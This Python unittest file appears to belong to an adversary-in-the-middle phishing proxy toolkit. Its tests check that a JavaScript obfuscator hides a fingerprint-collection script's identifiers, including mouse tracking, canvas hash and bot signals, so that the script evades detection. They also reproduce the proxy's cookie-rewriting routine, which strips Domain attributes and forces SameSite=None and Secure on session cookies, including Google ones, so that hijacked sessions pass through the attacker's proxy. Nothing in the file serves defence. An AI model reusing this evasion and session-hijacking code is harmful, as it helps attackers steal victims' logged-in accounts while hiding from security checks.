
import unittest
import re
import os
import sys
import subprocess
from core.security.obfuscator import JavaScriptObfuscator

class TestStealthComponents(unittest.TestCase):
    def test_js_obfuscation(self):
        print("\n[Test] Testing JS Obfuscation...")
        
        # 1. Read original JS
        js_path = os.path.abspath("core/assets/js/fingerprint_collector.js")
        with open(js_path, "r") as f:
            original_js = f.read()
            
        # 2. Obfuscate
        obfuscator = JavaScriptObfuscator()
        obfuscated_js = obfuscator.obfuscate(original_js)
        
        # 3. Check if key variables are replaced
        target_vars = ['FingerprintCollector', 'mouseMoves', 'canvasHash', 'botSignals']
        for var in target_vars:
            # We check for the variable declaration or usage pattern
            # Simple check: the variable name should not appear as a whole word
            pattern = r'\b' + re.escape(var) + r'\b'
            self.assertFalse(re.search(pattern, obfuscated_js), f"Variable '{var}' was not obfuscated!")
            
        print("[Pass] Key variables are obfuscated.")
        
        # 4. Check Syntax with Node.js
        temp_js_path = "temp_obfuscated.js"
        with open(temp_js_path, "w") as f:
            f.write(obfuscated_js)
            
        try:
            result = subprocess.run(["node", "-c", temp_js_path], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"[Fail] Obfuscated JS has syntax errors:\n{result.stderr}")
                self.fail("Obfuscated JS has syntax errors")
            else:
                print("[Pass] Obfuscated JS syntax is valid.")
        finally:
            if os.path.exists(temp_js_path):
                os.remove(temp_js_path)

    def test_cookie_rewriting_logic(self):
        print("\n[Test] Testing Cookie Rewriting Logic...")
        
        # Test cases from AiTMProxy logic
        test_cookies = [
            "session=123; Domain=.google.com; Path=/; Secure; HttpOnly",
            "auth=abc; domain=example.com; samesite=Lax",
            "tracking=xyz; Secure",
            "simple=1; SameSite=Strict"
        ]
        
        for cookie_raw in test_cookies:
            # Logic from AiTMProxy
            cookie_mod = re.sub(r'(?i);\s*domain=[^;]+', '', cookie_raw)
            
            if "samesite" not in cookie_mod.lower():
                cookie_mod += "; SameSite=None"
            else:
                cookie_mod = re.sub(r'(?i);\s*samesite=[^;]+', '; SameSite=None', cookie_mod)

            if "secure" not in cookie_mod.lower():
                 cookie_mod += "; Secure"
                 
            print(f"Original: {cookie_raw}")
            print(f"Modified: {cookie_mod}")
            
            # Assertions
            self.assertNotIn("Domain=", cookie_mod)
            self.assertNotIn("domain=", cookie_mod)
            self.assertIn("SameSite=None", cookie_mod)
            self.assertIn("Secure", cookie_mod)
            
        print("[Pass] Cookie rewriting logic is correct.")

if __name__ == '__main__':
    unittest.main()
